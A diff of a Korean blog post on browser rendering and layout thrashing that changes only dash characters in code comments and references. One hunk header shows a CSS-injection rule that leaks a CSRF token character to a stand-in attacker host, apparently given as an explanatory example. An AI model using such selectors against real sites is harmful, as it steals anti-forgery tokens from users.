@@ -33,12 +33,12 @@ published: true
 9편에서 짚은 내용을 조금 더 정확히 하면, 레이아웃을 강제하는 것은 **레이아웃 결과에 의존하는 값을 읽는 행위**다. `offsetTop`, `offsetWidth`, `getBoundingClientRect()`, `scrollTop`, `getComputedStyle()`의 일부 속성이 여기 해당한다.
 
 ```js
-// 나쁨 — 쓰기와 읽기가 교대하면 반복 횟수만큼 레이아웃이 돈다
+// 나쁨 – 쓰기와 읽기가 교대하면 반복 횟수만큼 레이아웃이 돈다
 for (const el of items) {
   el.style.width = el.offsetWidth + 10 + 'px';
 }
 
-// 좋음 — 읽기를 먼저 모으고 쓰기를 몰아서 한다
+// 좋음 – 읽기를 먼저 모으고 쓰기를 몰아서 한다
 const widths = items.map(el => el.offsetWidth);   // 레이아웃 1회
 items.forEach((el, i) => el.style.width = widths[i] + 10 + 'px');
 ```
@@ -114,6 +114,6 @@ input[name="csrf"][value^="b"] { background: url(https://attacker.example/?b); }
 
 ### 참고
 
-- [RenderingNG deep-dive: BlinkNG](https://developer.chrome.com/docs/chromium/blinkng) — 파이프라인 단계 분리의 배경
-- [XS-Leaks Wiki](https://xsleaks.dev/) — 관측 채널 목록과 방어
-- [CSS Containment](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_containment) — MDN
+- [RenderingNG deep-dive: BlinkNG](https://developer.chrome.com/docs/chromium/blinkng) – 파이프라인 단계 분리의 배경
+- [XS-Leaks Wiki](https://xsleaks.dev/) – 관측 채널 목록과 방어
+- [CSS Containment](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_containment) – MDN
